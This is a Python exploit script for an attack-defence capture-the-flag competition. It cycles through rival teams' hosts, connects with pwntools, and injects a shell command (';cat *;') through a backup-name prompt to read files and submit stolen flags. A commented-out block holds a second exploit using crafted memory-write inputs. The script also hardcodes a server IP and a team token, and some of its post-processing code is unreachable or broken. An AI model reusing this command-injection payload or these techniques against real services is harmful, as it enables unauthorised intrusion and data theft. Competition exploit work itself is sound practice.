#!/usr/bin/env python3

import swpag_client
import os
import pwn

URL = "34.211.129.130"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "i5RFobhxbx8TCO1dTKWN"
SERVICE_ID = 1 # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Team 31"

def module_name():
  return "backup-exploit"

def module_help():
  return "a backup exploit to be thrown by the auto-runner module"

def module_usage():
  return "{0}".format(module_name())

def main():
  try:
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
    
    for target in team.get_targets(SERVICE_ID):
      # Ignore our own team
      if (target["team_name"] == EXCLUDE_TEAM_NAME):
        continue

      flag_id = target["flag_id"]
      hostname = target["hostname"]
      port = target["port"]

      print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

      flag_obtained = None

      # Put exploit here and (hopefully) update the "flag_obtained" variable above!
      # Don't forget logic for if the service is patched or offline! Otherwise a hang could be fatal, this can be as simple as wrapping your exploit logic in a try/except block
      '''This is the example from the live event, using pwn tools. 
      r = pwn.remote(target['hostname'], 10001)
      r.recvuntil("username:")
      r.send("sh\n")
      r.recvuntil("password:")
      r.send("pwned\n")
      r.recvuntil("work:")
      r.send("pwned\n")
      r.recvuntil("result")
      r.send("S\n")
      r.recvuntil("end\n")
      r.send("V0=V-8+0\n")
      r.send("V1=V0+10641\n")
      r.send("V2=V0+130\n")
      r.send("V-1073741792=V2+0\n")
      r.send("V-1073741791=V1+0\n")
      r.send("\n")
      r.send("cat /home/chall/service/rw/"+target['flag_id'] + "_*")
      flag_obtained = r.read(4096).split("\n")[0]
      print(flag_obtained)
      '''

      r = pwn.remote(target["hostname"], 10001)
      print(r.recvuntil("Exit.\n> "))
      r.send("2\n")
      print(r.recvuntil("backup: "))
      r.send("name\n")
      print(r.recvuntil("backup: "))
      r.send(";cat *;\n")
      a = r.recvall(timeout=2)
      r.close()

      a = a.split("FLG")
      if len(a) < 1:
        continue

      z = []
      for potential_flag in a:
        if a.index(potential_flag) == len(a) - 1:
          continue
        z.append("FLG" + potential_flag)
        if len(z) >= 50:
          print(team.submit_flag(z))
          z = []
      continue

      a = a.split("\n")
      for line in a:
        if not line.endswith(".secure.bak"):
          continue
        b = line[:-11]
        
        if len(b.split("_")) < 2:
          continue
        b = b.split("_")[1]
        
        if not b.startswith("FLG"):
          continue
        print(team.submit_flag([b]))

      if (flag_obtained is not None):
        print(team.submit_flag([flag_obtained]))
      
  except Exception as e:
    print(e)

if __name__ == "__main__":
  main()
